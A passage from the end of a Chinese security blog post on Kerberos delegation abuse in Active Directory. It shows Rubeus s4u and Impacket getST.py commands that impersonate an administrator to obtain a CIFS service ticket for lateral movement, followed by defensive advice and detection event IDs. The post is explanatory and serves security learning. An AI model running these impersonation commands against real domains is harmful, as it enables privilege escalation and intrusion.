+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">754234C8F5BF1F736099B0BEED55B052</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
+<span class="c">#Impacket</span>
+<span class="n">python3</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">matty</span><span class="p">$</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span>
+<span class="c">#然后可以利用psexec横向（Windows上还需要申请HOST票据才能利用psexec，impacket不用）</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ol>
+<h2 id="防御与检测"><a href="#防御与检测" class="anchor-link">#</a><a href="#contents:防御与检测" class="headings">防御与检测</a></h2>
+<ol>
+<li>Windows 2012 R2及更高的系统建立了受保护的用户组，组内用户不允许被委派并且当这个组内的用户登录时，不能使用NTLM认证。如果设置高权限用户设置不能被委派或者加入保护组，那么发起Kerberos请求时只能进行S4U2SELF，不能进行S4U2PROXY。</li>
+<li>Kerberos预认证时不使用DES或者RC4等加密算法。微软从2008和Vista开始添加了Kerberos AES（128和256）加密，在Windows操作系统中大多数的Kerberos请求将使用AES进行加密，任何一个使用Kerberos RC4加密请求的票证都是异常情况。</li>
+<li>通过域的组策略强制设置主机账号的最长有效期为 30 天。</li>
+<li>5136日志记录对安全描述符的修改，4672日志显示该用户已有新特权。</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li><a href="https://daiker.gitbook.io/windows-protocol/kerberos/2" target="_blank" rel="noopener">TGS_REQ &amp; TGS_REP</a></li>
+<li><a href="https://mp.weixin.qq.com/s/PDhCRD1aOcmtd2wMUrv8Qg" target="_blank" rel="noopener">干货 | 全网最详细的Kerberos协议及其漏洞</a></li>
+<li><a href="https://www.redteaming.top/2020/03/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">域渗透——基于资源的约束委派利用</a></li>
+<li><a href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/#4-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE" target="_blank" rel="noopener">基于域委派的攻击</a></li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://myzxcg.com/2021/10/域委派利用/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/09/%E5%9F%9F%E7%94%A8%E6%88%B7%E5%8F%A3%E4%BB%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E6%9A%B4%E7%A0%B4/" class="related-link">域用户口令策略与暴破</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="related-link">组策略利用与横向移动</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="related-link">域用户与域成员机器关系及利用</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/08/Windows%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B-ACL%E5%88%86%E6%9E%90/" class="related-link">Windows访问控制模型--ACL分析</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="related-link">利用.NET 反序列化做权限维持</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a> <a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/" rel="tag" class="post-tag-link">#域相关</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" rel="prev">&lt; Java反序列化基础</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/09/%E5%9F%9F%E7%94%A8%E6%88%B7%E5%8F%A3%E4%BB%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E6%9A%B4%E7%A0%B4/" rel="next">域用户口令策略与暴破 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
